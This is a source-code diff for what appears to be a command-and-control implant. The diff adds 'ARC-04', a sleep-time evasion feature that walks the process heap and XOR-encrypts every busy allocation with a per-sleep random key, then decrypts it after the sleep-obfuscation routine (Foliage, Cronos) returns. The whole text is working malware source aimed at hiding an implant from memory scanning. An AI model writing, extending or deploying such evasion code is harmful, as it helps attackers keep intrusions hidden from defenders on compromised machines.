@@ -647,6 +647,77 @@ LEAVE: /* cleanup */
 
 #endif
 
+/* =========================================================================
+ * ARC-04: Heap encryption during sleep
+ * =========================================================================
+ *
+ * Before the agent enters any sleep-obfuscation routine, all currently-busy
+ * heap allocations on the default process heap are XOR-encrypted with a
+ * fresh 16-byte per-sleep random key.  After the sleep completes the same
+ * walk is performed again to reverse the XOR.  Because XOR is its own
+ * inverse, HeapEncryptDecrypt() is called once to encrypt and once to
+ * decrypt — no separate encrypt/decrypt flag is required.
+ *
+ * Only busy (allocated, user-data) blocks are touched; the heap manager's
+ * own metadata and free-list entries are left intact so that heap operations
+ * performed inside the sleep routine (e.g. FoliageObf's LocalAlloc calls)
+ * continue to work correctly.
+ *
+ * The key lives on the calling thread's stack and is wiped with
+ * RtlSecureZeroMemory after decryption.
+ */
+
+/*!
+ * @brief
+ *  XOR-crypt @p Size bytes at @p Data with the repeating @p Key.
+ *
+ * @param Data    Pointer to the buffer to crypt in-place.
+ * @param Size    Number of bytes to process.
+ * @param Key     Key bytes (must be > 0).
+ * @param KeyLen  Length of Key in bytes.
+ */
+static VOID HeapXorBlock(
+    IN OUT PUCHAR Data,
+    IN     SIZE_T Size,
+    IN     PUCHAR Key,
+    IN     ULONG  KeyLen
+) {
+    for ( SIZE_T i = 0; i < Size; i++ ) {
+        Data[ i ] ^= Key[ i % KeyLen ];
+    }
+}
+
+/*!
+ * @brief
+ *  Walk the default process heap and XOR-encrypt (or decrypt) every busy
+ *  allocation with @p Key.  Calling this function twice with the same key
+ *  restores the original plaintext.
+ *
+ * @param Key     16-byte key generated fresh each sleep cycle.
+ * @param KeyLen  Length of Key (should be 16).
+ */
+VOID HeapEncryptDecrypt(
+    IN PUCHAR Key,
+    IN ULONG  KeyLen
+) {
+    PVOID                HeapHandle = NtProcessHeap();
+    RTL_HEAP_WALK_ENTRY  Entry      = { 0 };
+    NTSTATUS             Status;
+
+    if ( ! Instance->Win32.RtlWalkHeap ) {
+        return;
+    }
+
+    while ( NT_SUCCESS( Status = Instance->Win32.RtlWalkHeap( HeapHandle, &Entry ) ) ) {
+        if ( ( Entry.Flags & RTL_HEAP_BUSY ) &&
+               Entry.DataAddress != NULL    &&
+               Entry.DataSize    >  0       )
+        {
+            HeapXorBlock( (PUCHAR) Entry.DataAddress, Entry.DataSize, Key, KeyLen );
+        }
+    }
+}
+
 /*!
  * @brief
  *  Context block shared between the main thread and the Cronos APC callback.
@@ -913,6 +984,23 @@ VOID SleepObf(
         Technique = 0;
     }
 
+    /* ARC-04: generate a per-sleep heap encryption key and encrypt the heap
+     * before entering the sleep technique.  The heap is decrypted after the
+     * sleep returns.  Heap encryption is active whenever any sleep-obfuscation
+     * technique is selected; it is skipped for the plain-sleep fallback path
+     * so that threads running post-ex jobs are not interrupted. */
+    UCHAR HeapKey[ 16 ]  = { 0 };
+    BOOL  DoHeapEncrypt  = ( Technique != SLEEPOBF_NO_OBF ) &&
+                           ( Instance->Win32.RtlWalkHeap  != NULL );
+
+    if ( DoHeapEncrypt ) {
+        for ( BYTE i = 0; i < 16; i++ ) {
+            HeapKey[ i ] = (UCHAR) RandomNumber32();
+        }
+        PUTS( "[ARC-04] Encrypting heap before sleep" )
+        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
+    }
+
     switch ( Technique )
     {
         case SLEEPOBF_FOLIAGE: {
@@ -957,6 +1045,13 @@ VOID SleepObf(
                 FALSE
             );
         }
+    }
+
+    /* ARC-04: decrypt heap after waking up, then wipe the key from the stack */
+    if ( DoHeapEncrypt ) {
+        PUTS( "[ARC-04] Decrypting heap after sleep" )
+        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
+        RtlSecureZeroMemory( HeapKey, sizeof( HeapKey ) );
     }
 
 #else
